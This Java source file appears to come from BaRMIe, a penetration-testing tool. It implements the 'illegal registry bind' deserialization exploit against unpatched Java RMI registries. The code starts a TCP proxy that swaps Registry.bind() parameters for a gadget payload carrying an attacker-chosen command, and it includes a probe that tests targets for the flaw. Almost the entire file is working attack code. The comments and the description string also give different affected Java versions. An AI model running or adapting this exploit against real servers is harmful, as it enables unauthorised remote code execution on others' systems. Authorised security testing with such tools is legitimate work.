package nb.barmie.modes.attack.attacks.Java;

import java.io.InvalidClassException;
import java.io.Serializable;
import java.net.InetAddress;
import java.net.UnknownHostException;
import java.rmi.AlreadyBoundException;
import java.rmi.Remote;
import java.rmi.RemoteException;
import java.rmi.ServerException;
import java.rmi.UnmarshalException;
import java.rmi.registry.LocateRegistry;
import java.rmi.registry.Registry;
import nb.barmie.exceptions.BaRMIeException;
import nb.barmie.modes.attack.DeserPayload;
import nb.barmie.modes.attack.RMIDeserAttack;
import nb.barmie.modes.enumeration.RMIEndpoint;
import nb.barmie.net.proxy.RMIBindExploitProxy;

/***********************************************************
 * Deliver a deserialization payload to an RMI registry via
 * the Registry.bind() method.
 * 
 * Affects Java 6u131, 7u121, 8u112 and below, along with
 * JRockit R28.3.12 and below.
 * 
 * This attack works by using a TCP proxy to issue an
 * illegal call to Registry.bind() by modifying the method
 * parameters as the pass through the proxy and injecting
 * a deserialization payload.
 * 
 * Requires POP gadgets to be available on the CLASSPATH
 * of the RMI registry service.
 * 
 * Written by Nicky Bloor (@NickstaDB).
 **********************************************************/
public class IllegalRegistryBind extends RMIDeserAttack {
	/*******************
	 * Dummy payload used to test for vulnerable targets.
	 ******************/
	private final byte[] _dummyPayload = {
		(byte)0x73, (byte)0x72, (byte)0x00, (byte)0x10, (byte)0x6a, (byte)0x61, (byte)0x76, (byte)0x61, (byte)0x2e, (byte)0x6c, (byte)0x61, (byte)0x6e, (byte)0x67, (byte)0x2e, (byte)0x4f, (byte)0x62, (byte)0x6a,
		(byte)0x65, (byte)0x63, (byte)0x74, (byte)0x12, (byte)0xe2, (byte)0xa0, (byte)0xa4, (byte)0xf7, (byte)0x81, (byte)0x87, (byte)0x38, (byte)0x02, (byte)0x00, (byte)0x00, (byte)0x70, (byte)0x78, (byte)0x70
	};
	
	/*******************
	 * Dummy class implementing java.rmi.Remote which we use to make a valid
	 * call to Registry.bind().
	 * 
	 * The actual attack and payload injection occurs within the class
	 * BindPayloadInjectingProxyThread.
	 ******************/
	private static class BaRMIeBindExploit implements Remote, Serializable {
	}
	
	/*******************
	 * Set attack properties.
	 ******************/
	public IllegalRegistryBind() {
		super();
		this.setDescription("Java RMI registry illegal bind deserialization");
		this.setDetailedDescription("Java version 6u131, 7u121, 8u121 and below, and JRockit R28.3.12 and below do not validate the types of the parameter to the RMI Registry.bind() method at the server side prior to deserializing them. This enables us to inject a deserialization payload at the network level by replacing either parameter to bind() with a payload object.");
		this.setRemediationAdvice("[Java] Update to Java 6u141, Java 7u131, Java 8u121, JRockit R28.3.13 or greater.");
		this.setAppSpecific(false);
		this.setRequiresNonDefaultDependency(true);
	}
	
	/*******************
	 * Check if the given endpoint can be attacked.
	 * 
	 * This check is performed by executing a dummy attack against the
	 * endpoint and observing the resulting exception.
	 * 
	 * @param ep An enumerated RMI endpoint.
	 * @return True if we can attack it.
	 ******************/
	public boolean canAttackEndpoint(RMIEndpoint ep) {
		RMIBindExploitProxy proxy = null;
		Registry reg;
		
		//Execute a dummy attack
		try {
			//Start a bind exploit proxy
			proxy = new RMIBindExploitProxy(InetAddress.getByName(ep.getEndpoint().getHost()), ep.getEndpoint().getPort(), this._options, this._dummyPayload);
			proxy.startProxy();
			
			//Get a proxied RMI registry reference
			reg = LocateRegistry.getRegistry(proxy.getServerListenAddress().getHostAddress(), proxy.getServerListenPort());
			
			//Bind a dummy object in an attempt to trigger the vulnerability
			reg.bind(this.generateRandomString(), new BaRMIeBindExploit());
		} catch(BaRMIeException | UnknownHostException | RemoteException | AlreadyBoundException ex) {
			//An up to date RMI registry will, by default, reject the dummy object
			if(ex instanceof ServerException && ex.getCause() != null && ex.getCause() instanceof UnmarshalException && ex.getCause().getCause() != null && ex.getCause().getCause() instanceof InvalidClassException) {
				//Check for "filter status: REJECTED"
				if(ex.getCause().getCause().toString().contains("filter status: REJECTED")) {
					//Test payload was filtered, likely this attack isn't possible
					return false;
				}
			}
		} finally {
			//Stop the proxy
			if(proxy != null) {
				proxy.stopProxy(true);
			}
		}
		
		//In all other cases we should be able to attack the registry
		return true;
	}
	
	/*******************
	 * Execute the deserialization attack against the given RMI endpoint using
	 * the given payload.
	 * 
	 * @param ep The enumerated RMI endpoint.
	 * @param payload The deserialization payload to deliver.
	 * @param cmd The command to use for payload generation.
	 ******************/
	public void executeAttack(RMIEndpoint ep, DeserPayload payload, String cmd) throws BaRMIeException {
		RMIBindExploitProxy proxy = null;
		Registry reg;
		
		//Launch the attack
		try {
			//Start a bind exploit proxy
			System.out.println("[~] Starting RMI registry proxy...");
			proxy = new RMIBindExploitProxy(InetAddress.getByName(ep.getEndpoint().getHost()), ep.getEndpoint().getPort(), this._options, payload.getBytes(cmd, 0));
			proxy.startProxy();
			System.out.println("[+] Proxy started");
			
			//Get a proxied RMI registry reference
			System.out.println("[~] Getting proxied RMI Registry reference...");
			reg = LocateRegistry.getRegistry(proxy.getServerListenAddress().getHostAddress(), proxy.getServerListenPort());
			
			//Bind a dummy object in an attempt to trigger the vulnerability
			System.out.println("[~] Calling bind(PAYLOAD, null)...");
			reg.bind(this.generateRandomString(), new BaRMIeBindExploit());
		} catch(Exception ex) {
			//Check the exception for useful info
			this.checkDeserException(ex);
		} finally {
			//Stop the proxy
			if(proxy != null) {
				proxy.stopProxy(true);
			}
		}
	}
}
